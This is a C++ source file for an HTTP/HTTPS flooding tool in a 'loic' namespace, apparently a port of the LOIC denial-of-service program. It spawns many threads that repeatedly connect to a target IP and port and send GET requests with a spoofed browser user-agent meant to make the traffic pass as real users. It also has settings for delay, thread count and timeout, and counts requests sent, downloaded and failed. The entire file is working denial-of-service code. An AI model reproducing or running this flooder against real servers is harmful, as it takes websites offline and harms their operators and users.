/*
 * HTTPFlooder.cpp
 *
 *  Created on: Dec 7, 2012
 *      Author: ivan
 */


#include "HTTPFlooder.h"


namespace loic {

void HTTPFlooder::work()
{
	struct addrinfo hints;
	struct addrinfo *result;
	int sfd, s;
	size_t len;
	ssize_t nread;
	char buffer[BUF_SIZE];
	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_INET;    /* Allow IPv4 or IPv6 */
	hints.ai_socktype = SOCK_STREAM; /* Datagram socket */
	hints.ai_flags = 0;
	hints.ai_protocol = 0;          /* Any protocol */
	SSL_CTX * context;
	SSL* ssl_ptr;
	try
	{
		//gets the address
		if(debug)
		{
			std::cout<<"getting address\n";
		}
		std::stringstream port("");
		port<<this->port;
		s = getaddrinfo(ip.c_str(),port.str().c_str(), &hints, &result);
		if (s != 0) {
			std::cerr<<"getaddrinfo: "<<gai_strerror(s)<<std::endl;
			return;
		}

		//gets the address info which persists in the rest of the connections
		struct addrinfo *rp;

		for (rp = result; rp != NULL; rp = rp->ai_next) {
			sfd = socket(rp->ai_family, rp->ai_socktype,rp->ai_protocol);

			if (sfd == -1)
				continue;

			if (connect(sfd, rp->ai_addr, rp->ai_addrlen) != -1)
			{
				if(!resp)
				{
					int val = fcntl(sfd, F_GETFL, 0);
					fcntl(sfd, F_SETFL, val | O_NONBLOCK);
				}
				this->state = requestingState;
				if(debug)
				{
					std::cout<<rp->ai_addr<<" "<<rp->ai_addrlen<<std::endl;
					std::cout<<"successfully connect\n";
				}
				close(sfd);
				break;                  // Success
			}

			close(sfd);
		}

		if (rp == NULL) {               // No address succeeded
			std::cerr<< "Could not connect\n";
			return;
		}

		if(this->port == SSL_PORT)
		{
			//new context saying we are a client

			context = SSL_CTX_new(SSLv23_client_method());

			if(context == NULL)
				ERR_print_errors_fp(stderr);
			//create a struct for the connectionf
			ssl_ptr = SSL_new(context);

			if(ssl_ptr == NULL)
			{
				ERR_print_errors_fp(stderr);
				std::cerr<<"creation of a new structure failed\n";
				return;
			}
		}

		//the real action
		while(this->isFlooding())
		{
			this->state = readyState;


			//tcp connection
			sfd = socket(rp->ai_family, rp->ai_socktype,rp->ai_protocol);

			if (sfd == -1)
				return;
			if (connect(sfd, rp->ai_addr, rp->ai_addrlen) != -1)
			{
				if(!resp)
				{
					if(debug)
						std::cout<<"non blocking\n";
					int val = fcntl(sfd, F_GETFL, 0);
					fcntl(sfd, F_SETFL, val | O_NONBLOCK);
				}
				this->state = requestingState;
				if(debug)
				{
					std::cout<<"successfully connect\n";
				}
			}

			//tick
			//WriteLock w_lock(locker);
			lastAction = time(NULL)/3600;
			//locker.unlock();


			this->state = connectingState;


			//handles ssl
			if(this->port ==SSL_PORT)
			{


				//connect the ssl struct to the tcp connection
				if(!SSL_set_fd(ssl_ptr,sfd))
					ERR_print_errors_fp(stderr);

				int con = SSL_connect(ssl_ptr);

				if(con!= 1)
				{
					ERR_print_errors_fp(stderr);
					std::cerr<<"connection error\n";
					continue;
				}
				if(debug)
				{
					std::cout<<"finished ssl connection\n";
				}

				//WriteLock w_lock(locker);
				requested++;
				//locker.unlock();
				//sending
				std::stringstream stream;
				stream<<"GET /"<<this->subsite<<" \r\n\r\n";
				SSL_write(ssl_ptr,stream.str().c_str(),stream.str().length());


				//reading

				int received = 0;
				if(con)
				{
					//reads just a lil bit
					{
						received = SSL_read(ssl_ptr,buffer,BUF_SIZE);
						if(received == BUF_SIZE)
						{
							if(reader)
							{
								std::cout<<buffer;
							}
						}
						else
						{
							std::cerr<<"not reading properly\n";
						}


						//if(received<BUF_SIZE)
							//break;
					}

					//WriteLock w_lock1(locker);
					downloaded++;
					//locker.unlock();
				}
				else
				{
					std::cout<<SSL_get_error(ssl_ptr,con)<<std::endl;
					std::cerr<<"failed ssl connection\n";
					continue;
				}


				//closing
				if(ssl_ptr)
				{
					if(debug)
					{
						std::cout<<"shutdown \n";
					}
					SSL_shutdown(ssl_ptr);
				}


			}
			else
			{
				if(debug)
				{
					std::cout<<"sending"<<std::endl;
				}

				std::stringstream stream;
				//used this just so the server thinks it's a proper user agent
				stream<<"GET /"<<this->subsite<<" HTTP/1.1\r\nHost: "<<ip<<"\r\nUser-agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11\r\nConnection: keep-alive\r\n\r\n";


				len = stream.str().length() + 1;
				/* +1 for terminating null byte */

				if (write(sfd, stream.str().c_str(), len) != signed(len))
				{
					std::cerr<<"partial/failed write"<<std::endl;
					continue;
				}

				this->state = downloadingState;
				//WriteLock w_lock(locker);
				requested++;
				//locker.unlock();

				if(debug)
				{
					std::cout<<"receiving..."<<std::endl;
				}
				if(resp)
				{
					nread = read(sfd, buffer, BUF_SIZE);
					if (nread == -1) {
						perror("read");
						std::cerr<<EXIT_FAILURE<<std::endl;
						continue;
					}
					else if( nread == BUF_SIZE)
					{
						if(reader)
							std::cout<<buffer;
					}
					else
					{
						if(debug)
							std::cerr<<"Error number: "<<errno<<std::endl;;
					}
					if(debug)
					{
						std::cout<<"Received "<<nread<<" bytes: "<<buffer<<std::endl;
					}
				}

				this->state = completedState;
				//WriteLock w_lock1(locker);
				downloaded++;
				//locker.unlock();

				if(delay>0)
				{
					boost::this_thread::sleep(boost::posix_time::milliseconds(delay));
				}
			}
			close(sfd);
		}
	}
	catch(std::exception & exe)
	{
		std::cerr<<exe.what()<<std::endl;
		std::cout<<"caught an exception"<<std::endl;
	}
	flooding = false;

	//clean up after all the flooding
	if(ssl_ptr)
	{
		std::cout<<"free ssl_ptr\n";
		SSL_free(ssl_ptr);
	}
	if(context)
	{
		std::cout<<"free context\n";
		SSL_CTX_free(context);
	}

	freeaddrinfo(result);
}

	void HTTPFlooder::checkTimeOut()
	{
		while(flooding)
		{
			time_t now = time(NULL)/3600;	//time since epoch

			if(difftime(now,lastAction)>timeout)
			{
				WriteLock w_lock(locker);
				flooding = false;
				this->failed++;
				this->state = failedState;
				std::cerr<<"Error! TIMED OUT\n";
				locker.unlock();
			}
			

			std::stringstream report("");
			std::cout<<"\033[s";
			report<<"Requested: "<<this->requested<<"\t\tDownloaded: "<<this->downloaded<<"\t\tFailed: "<<this->failed<<"\033[u";
			
			std::cout<<report.str();
			std::cout<<std::flush;
			boost::this_thread::sleep(boost::posix_time::seconds(1));
		}
	}
	void HTTPFlooder::Start()
	{
		flooding = true;
		lastAction = time(NULL);

		std::cout<<"Target:\t\t "<<this->ip<<std::endl;
		std::cout<<"Port:\t\t\t"<<this->port<<std::endl;
		std::cout<<"Receiving:\t\t"<<(this->resp?"true":"false")<<std::endl;
		std::cout<<"Delay:\t\t\t"<<this->delay<<std::endl;
		std::cout<<"Timeout:\t\t"<<this->timeout<<std::endl;
		std::cout<<"Threads:\t\t"<<this->numThreads<<std::endl<<std::endl;

		//can use bind as well
		boost::thread t(&loic::HTTPFlooder::checkTimeOut,this);
		for(unsigned int i = 0; i<numThreads;i++)
		{
			boost::thread thread(&loic::HTTPFlooder::work,this);
		}

	}


	void HTTPFlooder::Stop()
	{
		WriteLock w_lock(locker);
		flooding = false;
		locker.unlock();
	}

} /* namespace loic */
